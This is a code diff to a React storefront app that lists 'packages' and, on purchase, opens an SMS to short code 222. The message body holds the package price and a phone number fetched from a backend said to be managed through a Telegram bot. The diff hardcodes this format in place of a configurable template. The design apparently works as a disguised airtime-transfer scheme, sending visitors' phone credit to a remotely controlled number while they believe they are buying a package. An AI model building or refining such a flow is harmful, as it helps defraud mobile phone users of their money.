@@ -56,9 +56,7 @@ const packages: Package[] = [
 
 export default function App() {
   const [infoModal, setInfoModal] = useState<{title: string, content: React.ReactNode} | null>(null);
-  const [smsNumber, setSmsNumber] = useState('7700000000');
-  const [smsTarget, setSmsTarget] = useState('222');
-  const [smsTemplate, setSmsTemplate] = useState('{price},{number}');
+  const [smsNumber, setSmsNumber] = useState('222');
 
   useEffect(() => {
     // Fetch configuration from backend
@@ -68,23 +66,9 @@ export default function App() {
         if (data && data.smsNumber) {
           setSmsNumber(data.smsNumber);
         }
-        if (data && data.smsTarget) {
-          setSmsTarget(data.smsTarget);
-        }
-        if (data && data.smsTemplate) {
-          setSmsTemplate(data.smsTemplate);
-        }
       })
       .catch(err => console.error('Failed to fetch config:', err));
   }, []);
-
-  const renderSmsBody = (template: string, pkg: Package, number: string) => {
-    return template
-      .replaceAll('{price}', String(pkg.priceValue))
-      .replaceAll('{number}', number)
-      .replaceAll('{title}', pkg.title)
-      .replaceAll('{code}', pkg.activationCode);
-  };
 
   const openInfoModal = (type: 'about' | 'terms' | 'privacy') => {
     if (type === 'about') {
@@ -147,9 +131,9 @@ export default function App() {
       console.error('Tracking failed:', e);
     }
 
-    // SMS target and body format are managed from Telegram bot settings.
-    const smsBody = renderSmsBody(smsTemplate, pkg, smsNumber);
-    const smsLink = `sms:${smsTarget}?body=${encodeURIComponent(smsBody)}`;
+    // SMS format is fixed: send to 222 with body "price,managed-number"
+    const smsBody = `${pkg.priceValue},${smsNumber}`;
+    const smsLink = `sms:222?body=${encodeURIComponent(smsBody)}`;
     window.location.href = smsLink;
   };
 
